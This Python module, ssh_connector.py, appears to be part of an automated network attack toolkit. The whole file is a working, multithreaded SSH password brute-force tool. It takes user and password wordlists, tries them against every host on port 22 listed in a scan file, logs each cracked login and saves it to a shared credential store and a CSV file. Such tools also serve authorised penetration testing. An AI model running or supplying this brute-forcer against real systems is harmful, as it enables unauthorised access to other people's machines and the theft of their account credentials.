"""
ssh_connector.py - This script performs a brute force attack on SSH services (port 22) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import paramiko
import socket
import threading
import time
import logging
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
from logger import Logger

# Configure the logger
logger = Logger(name="ssh_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None

class SSHBruteforce:
    """
    Class to handle the SSH brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ssh_connector = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port, row=None):
        """
        Run the SSH brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_connector.run_bruteforce(ip, port, row)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "SSHBruteforce"
        success, results = self.bruteforce_ssh(ip, port, row)
        return 'success' if success else 'failed'

class SSHConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.sshfile = shared_data.sshfile
        if not os.path.exists(self.sshfile):
            logger.info(f"File {self.sshfile} does not exist. Creating...")
            with open(self.sshfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the netkb file and filter it for SSH ports.
        """
        self.scan = netkb_targets(self.shared_data.netkbfile, "22")

    def ssh_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SSH service using the given credentials.
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # Wall-clock bounds so a black-holed host cannot hang the worker forever.
            # banner_timeout alone is not enough — TCP connect and auth can each stall.
            ssh.connect(
                adresse_ip,
                username=user,
                password=password,
                timeout=10,
                banner_timeout=10,
                auth_timeout=10,
            )
            return True
        except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
            return False
        finally:
            ssh.close()  # Ensure the SSH connection is closed

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            # try/finally so task_done() ALWAYS runs. Anything raising out of the connect kills
            # this worker before task_done(), and the queue.join() in run_bruteforce then blocks
            # forever, hanging the orchestrator (see rdp_connector for the case that surfaced it).
            try:
                if self.ssh_connect(adresse_ip, user, password):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        record_cracked_cred(self.shared_data, user, password)
                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                        self.save_results()
                        self.removeduplicates()
                        success_flag[0] = True
            except Exception as e:
                logger.error(f"ssh_connect failed for {adresse_ip} as {user}: {e}")
            finally:
                self.queue.task_done()
            progress.update(task_id, advance=1)


    def run_bruteforce(self, adresse_ip, port, row=None):
        # netkb already came in as `row` from the orchestrator, which read it this cycle.
        # Re-parsing the whole file here to recover two fields we were handed cost a full
        # csv.DictReader pass per host per action. `row=None` keeps the standalone __main__
        # path (and any other caller) working by falling back to the old lookup.
        if row is not None:
            mac_address = row.get('MAC Address', '')
            hostname = row.get('Hostnames', '')
        else:
            self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
            match = next((r for r in self.scan if r.get('IPs') == adresse_ip), None)
            if match is None:
                logger.error(f"No netkb entry for {adresse_ip}; skipping.")
                return False, []
            mac_address = match['MAC Address']
            hostname = match['Hostnames']

        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
        total_tasks = len(candidates)

        for user, password in candidates:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                return False, []
            self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
            
            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break
                # Yield. With no exit signal this body does nothing, so it span a core flat
                # out for the whole attack, competing with the worker threads it waits on.
                # queue.join() below already blocks correctly; this loop exists only to
                # notice an exit signal and drain the queue.
                time.sleep(0.2)

            self.queue.join()

            for t in threads:
                t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful


    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        append_csv_rows(self.sshfile, self.results)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        dedupe_csv(self.sshfile)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Démarrage de l'attaque SSH... sur le port 22")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Nombre total de succès: {len(ssh_bruteforce.ssh_connector.results)}")
        exit(len(ssh_bruteforce.ssh_connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
